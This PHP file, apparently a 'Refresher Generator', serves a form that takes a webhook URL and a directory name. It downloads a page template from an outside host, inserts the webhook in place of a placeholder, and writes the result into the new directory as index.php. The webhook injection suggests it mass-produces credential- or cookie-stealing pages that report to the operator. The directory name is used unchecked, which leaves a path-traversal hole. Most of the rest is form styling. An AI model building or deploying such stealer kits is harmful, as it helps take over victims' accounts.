<?php // Those shit coded by wosql#0101 aka. 4vz

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // get webhook from form input
    $webhook = $_POST['webhook'];

    // get directory name from form input
    $dirName = $_POST['dirName'];

    // create new directory
    mkdir($dirName);

    // copy index.php to new directory with webhook replaced
    $file = 'http://cosmicdrift.rf.gd/genfile/genfilemain.php';
    $newFile = $dirName . '/index.php';
    $content = file_get_contents($file);
    $webhookUrl = str_replace("webhookuser", $webhook, $content);
    file_put_contents($newFile, $webhookUrl);

    // redirect to the new file
    header("Location: $newFile");

} else {

    // if not POST request, show form
    ?>

    <html>
    <head>
        <title>Refresher Generator</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <style>
            /* styles for form go here */
        </style>
    </head>
    <body>
    <div class="form-container">
        <form method="POST" action="">
            <h1>Refresher Generator</h1>
            <br>
            <h11>Do Not Put Spaces, Periods,</h11><br>
            <h11>Fonts, Commas, In Your File Name!</h11>
            <br>
            <br>
            <span class="subtitle">Webhook:</span>
            <br>
            <input type="text" name="webhook" required>
            <br>
            <br>
            <span class="subtitle">Directory Name:</span>
            <br>
            <input type="text" name="dirName" required>
            <br>
            <br>
            <input type="submit" class="submit-btn" value="Generate">
        </form>
    </div>
<style>
        html {
            scroll-behavior: smooth;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .un {
            width: 75%;
            color: rgba(177, 177, 177, 0.3);

            font-weight: 700;
            font-size: 14px;
            letter-spacing: 1px;
            background: #1f1f1f;
            padding: 10px 20px;
            border: 2px solid rgba(0, 0, 0, 0.18) !important;
            border-radius: 20px;
            outline: none;
            box-sizing: border-box;
            border: 2px solid rgba(0, 0, 0, 0.02);
            margin-bottom: 50px;
            margin-left: 15px;
            text-align: center;
            margin-bottom: 27px;
            font-family: 'Ubuntu', sans-serif;
        }

        .un:focus, .pass:focus {
            border: 2px solid rgba(0, 0, 0, 0.18) !important;

        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #121212; /* fallback for old browsers */
            overflow-x: hidden;

            height: 100%;

            /* code to make all text unselectable */
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -o-user-select: none;
            user-select: none;
        }

        /* Disables selector ring */
        body:not(.user-is-tabbing) button:focus,
        body:not(.user-is-tabbing) input:focus,
        body:not(.user-is-tabbing) select:focus,
        body:not(.user-is-tabbing) textarea:focus {
            outline: none;
        }

        /* ########################################################## */

        h1 {
            color: white;

            font-size: 35px;
            font-weight: 800;
        }
        h11 {
            color: red;

            font-size: 16px;
            font-weight: 600;
        }

        .flex-container {
            width: 100vw;

            margin-top: 60px;

            display: flex;
            justify-content: center;
            align-items: center;
        }

        .content-container {
            width: 500px;
            height: 350px;
        }

        .form-container {
            display: flex;
            justify-content: center;
            align-items: center;

            width: 550px;
            height: 600px;

            margin-top: 5px;
            padding-top: 20px;

            border-radius: 14px;

            display: flex;
            justify-content: center;
            flex-direction: column;

            background: #1f1f1f;
            box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.199);
        }

        .subtitle {
            font-size: 11px;

            color: rgba(177, 177, 177, 0.3);
        }

        input {
            border: none;
            border-bottom: solid rgb(143, 143, 143) 1px;

            margin-bottom: 30px;

            background: none;
            color: rgba(255, 255, 255, 0.555);

            height: 35px;
            width: 300px;
        }

        .submit-btn {
            cursor: pointer;

            border: none;
            border-radius: 8px;

            box-shadow: 2px 2px 7px #38d39f70;

            background: #38d39f;
            color: rgba(255, 255, 255, 0.8);

            width: 80px;

            transition: all 1s;
        }

        .submit-btn:hover {
            color: rgb(255, 255, 255);

            box-shadow: none;
        }

        .yesorno {

            color: rgba(177, 177, 177, 0.3);

            background: #1f1f1f;

            border: 2px solid rgba(0, 0, 0, 0.18) !important;

            outline: none;
            box-sizing: border-box;
            border: 2px solid rgba(0, 0, 0, 0.02);

            font-family: 'Ubuntu', sans-serif;
        }

    </style>
    </body>
    </html>

    <?php
}
?>
